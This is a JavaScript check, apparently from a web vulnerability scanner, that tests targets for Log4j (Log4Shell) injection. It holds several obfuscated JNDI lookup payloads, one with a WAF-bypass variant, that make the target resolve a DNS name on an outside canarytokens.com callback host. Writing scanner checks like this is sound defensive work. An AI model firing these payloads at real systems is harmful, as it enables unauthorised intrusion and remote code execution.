classTestInjection.prototype.startTesting = function () {
    for (var i = 0; i < this.variations.count; i++) {

        let scanHostLog = scriptArg.target.host;
        // [*] classic test
        var rndToken  = AcuMonitor_signToken('hit' + randStrLC(10));
        var rndEnvVar = randStrLC(10);
        var payload   = "${j${::-n}di:dns${::-:}${::-/}/" + scanHostLog + "${::-.}" + "xxxxxxxxxxxxxxxxxx.canarytokens.com" + "}zzzz";

        if (this.foundVulnOnVariation) break;

        this.currentVariation = i;
        this.testInjectionAcuMonitor(payload, rndToken);

        // [*] second test tries to generate an exception and also has a WAF bypass
        rndToken  = AcuMonitor_signToken('hit' + randStrLC(10));
        rndEnvVar = randStrLC(10);
        payload   = strFromRawData(0x0a, 0x0d, 0xbf) + strFromRawData(0xF0, 0x9F, 0x92, 0xA1) + "'\"><&;|${${lower:j}${::-n}d${upper:ı}:dns${::-:}//" + scanHostLog + "${::-.}" + "xxxxxxxxxxxxxxxxxx.canarytokens.com" + "}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

        if (this.foundVulnOnVariation) break;

        this.currentVariation = i;
        this.testInjectionAcuMonitor(payload, rndToken);    

        // [*] Blind Log4j
        var reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), 47);
        if (reqId) {
            let reqIdParts = reqId.split("-");
            let reqScanId = reqIdParts[0];
            
            let scanHostAndPort = scriptArg.target.host;
            // if (scriptArg.target.port) scanHostAndPort += ":" + scriptArg.target.port;

            let reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1, 6);
            let domain = "dns.log4j." + scanHostAndPort + "." + reqScanId + "${::-.}1${::-.}" + "xxxxxxxxxxxxxxxxxx.canarytokens.com";
            let payload = "${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/" + domain + "}}";

            if (this.foundVulnOnVariation) break;

            this.currentVariation = i;
            this.testInjectionAcuMonitor(payload, false);
        }
    }
};
